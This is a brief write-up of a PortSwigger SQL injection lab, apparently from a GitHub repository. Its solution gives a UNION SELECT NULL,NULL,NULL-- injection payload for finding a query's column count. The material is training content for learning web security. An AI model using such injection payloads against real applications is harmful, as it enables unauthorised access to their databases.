## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5086ef31-864a-4e3f-a5b1-8f27bf57b35c)

## Solution :

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL,NULL--
```
